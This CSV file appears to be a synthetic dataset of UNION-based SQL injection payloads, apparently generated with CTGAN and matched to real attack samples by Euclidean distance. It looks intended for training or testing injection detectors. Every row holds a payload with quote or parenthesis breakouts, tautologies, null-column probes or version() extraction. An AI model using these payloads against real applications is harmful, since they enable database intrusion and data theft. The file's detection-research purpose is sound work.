id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000065,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000284,5.355434801474847
CTGAN_000066,attack,union,"1' where 8969  =  8969 union all select null,null,null,null,null--",nearest_attack_euclidean,R000602,5.325266284026107
CTGAN_000067,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,5.210116829706377
CTGAN_000068,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000371,6.160546177469102
CTGAN_000069,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000615,4.181574266776894
CTGAN_000070,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,3.563941072457672
CTGAN_000071,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000234,6.428002632542454
CTGAN_000072,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000025,5.306134950265895
CTGAN_000073,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000473,6.108959121199983
CTGAN_000074,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000773,4.342024057020981
CTGAN_000075,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,6.006949720918822
CTGAN_000076,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000451,5.313551752991618
CTGAN_000077,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,5.625487024858116
CTGAN_000078,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,6.009289027335924
CTGAN_000079,attack,union,"1%'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000660,4.309230318444914
CTGAN_000080,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,5.068128821357156
CTGAN_000081,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000395,4.362309406682482
CTGAN_000082,attack,union,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",nearest_attack_euclidean,R000193,3.9715094156548956
CTGAN_000083,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,6.321860261438898
CTGAN_000084,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,5.1073093171228034
CTGAN_000085,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000490,4.766304068857402
CTGAN_000086,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,6.682673529574479
CTGAN_000087,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000683,6.105795928628287
CTGAN_000088,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000456,2.6461341807445113
CTGAN_000089,attack,union,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",nearest_attack_euclidean,R000306,4.6850858458799225
CTGAN_000090,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.262098070121002
CTGAN_000091,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R000693,5.363010270309934
CTGAN_000092,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000362,4.478011354833522
CTGAN_000093,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000773,5.913156551523622
CTGAN_000094,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,4.039136805869979
CTGAN_000095,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000158,4.754718103382051
CTGAN_000096,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,5.238345156750134
CTGAN_000097,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000163,5.528211705579288
CTGAN_000098,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000096,6.649715273420046
CTGAN_000099,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000643,4.357071971040851
CTGAN_000100,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000221,4.749133848583564
CTGAN_000101,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000523,4.205301078140117
CTGAN_000102,attack,union,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",nearest_attack_euclidean,R000314,5.021839066748064
CTGAN_000103,attack,union,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",nearest_attack_euclidean,R000173,4.256327541180118
CTGAN_000104,attack,union,"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",nearest_attack_euclidean,R000626,4.701542889422654
CTGAN_000105,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000113,5.191974360831309
CTGAN_000106,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000634,4.287882348112875
CTGAN_000107,attack,union,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",nearest_attack_euclidean,R000353,3.899823104080391
CTGAN_000108,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,3.2605888603919735
CTGAN_000109,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000469,5.613037865082479
CTGAN_000110,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000719,5.934975079157297
CTGAN_000111,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,5.624279756245946
CTGAN_000112,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000106,5.091355367512504
CTGAN_000113,attack,union,"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000125,3.3957467615893067
CTGAN_000114,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,5.106811645462055
CTGAN_000115,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,5.3870028799970955
CTGAN_000116,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000683,5.352653283003775
CTGAN_000117,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000229,4.050051766552172
CTGAN_000118,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000486,6.548632605964181
CTGAN_000119,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000456,5.013042032696249
CTGAN_000120,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,6.533498855255272
CTGAN_000121,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,6.327072295214103
CTGAN_000122,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R000646,5.528860709810129
CTGAN_000123,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,6.2017520750167465
CTGAN_000124,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,6.056833176263112
CTGAN_000125,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R000646,6.3826730185128895
CTGAN_000126,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000265,5.006375911339417
CTGAN_000127,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,5.1085400985887
CTGAN_000128,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,5.299084295455655
CTGAN_000129,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000408,4.725363644457537
CTGAN_000130,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.7729386155114435
CTGAN_000131,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000379,5.094930591503254
CTGAN_000132,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000367,4.353354223275413
CTGAN_000133,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.00978719416482
CTGAN_000134,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,5.142157610553721
CTGAN_000135,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,5.322614675392537
CTGAN_000136,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000573,6.369134578708426
CTGAN_000137,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,5.186469401522069
CTGAN_000138,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,6.001194006194126
CTGAN_000139,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,5.350107830638205
CTGAN_000140,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000237,5.951381124912294
CTGAN_000141,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,4.150595081433974
CTGAN_000142,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.5064164643416245
CTGAN_000143,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000552,4.994196937977255
CTGAN_000144,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000451,6.334695422273782
CTGAN_000145,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000124,4.405742175932945
CTGAN_000146,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.397063763465193
CTGAN_000147,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,6.089283668950997
CTGAN_000148,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000719,5.4791165058617395
CTGAN_000149,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,4.401094497285741
CTGAN_000150,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,3.954871745336728
CTGAN_000151,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000772,4.328166881467469
CTGAN_000152,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,4.380454323224807
CTGAN_000153,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000651,6.435854175843779
CTGAN_000154,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000124,3.7887193590605936
CTGAN_000155,attack,union,"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",nearest_attack_euclidean,R000286,6.013045232186041
CTGAN_000156,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,5.253382028761003
CTGAN_000157,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000456,3.3941335358048406
CTGAN_000158,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000261,5.827248266666454
CTGAN_000159,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000381,4.879355328315953
CTGAN_000160,attack,union,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",nearest_attack_euclidean,R000357,4.249567596001418
CTGAN_000161,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R000567,5.4994979975975085
CTGAN_000162,attack,union,"1' where 8969  =  8969 union all select null,null,null,null,null--",nearest_attack_euclidean,R000602,5.760043381474474
CTGAN_000163,attack,union,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",nearest_attack_euclidean,R000339,5.322258547926873
CTGAN_000164,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000156,4.173667575376592
CTGAN_000165,attack,union,"1  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000227,5.668993258514406
CTGAN_000166,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.851042564426773
CTGAN_000167,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000714,4.483222285695054
CTGAN_000168,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,6.2313459387891825
CTGAN_000169,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000700,5.355572781956139
CTGAN_000170,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000664,5.805450202577354
CTGAN_000171,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,3.8998774710197512
CTGAN_000172,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000152,4.8681553208868795
CTGAN_000173,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000762,6.102338171550815
CTGAN_000174,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000236,5.978685652370138
CTGAN_000175,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000399,4.422757090199495
CTGAN_000176,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000451,4.6628599998828255
CTGAN_000177,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R000567,4.6572325621210355
CTGAN_000178,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,5.420983453023226
CTGAN_000179,attack,union,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",nearest_attack_euclidean,R000324,5.950167706193422
CTGAN_000180,attack,union,"1'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000187,6.087336888916364
CTGAN_000181,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000251,5.59960243947525
CTGAN_000182,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,5.643850013180106
CTGAN_000183,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.691650352759582
CTGAN_000184,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000374,4.983934210040763
CTGAN_000185,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000399,3.4963475071840535
CTGAN_000186,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000607,4.638006774534653
CTGAN_000187,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000435,5.4329636712156955
CTGAN_000188,attack,union,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000745,5.576192767574025
CTGAN_000189,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,4.03495226814319
CTGAN_000190,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,5.679890684858322
CTGAN_000191,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R000686,5.696689724788319
CTGAN_000192,attack,union,"1   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000372,6.209810209727738
CTGAN_000193,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000548,6.4220069096373305
CTGAN_000194,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,3.898069532786895
CTGAN_000195,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,6.0071350219995026
CTGAN_000196,attack,union,"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",nearest_attack_euclidean,R000144,5.493258891963198
CTGAN_000197,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R000774,5.386656137128387
CTGAN_000198,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000551,4.165626858507028
CTGAN_000199,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000040,6.849341754930361
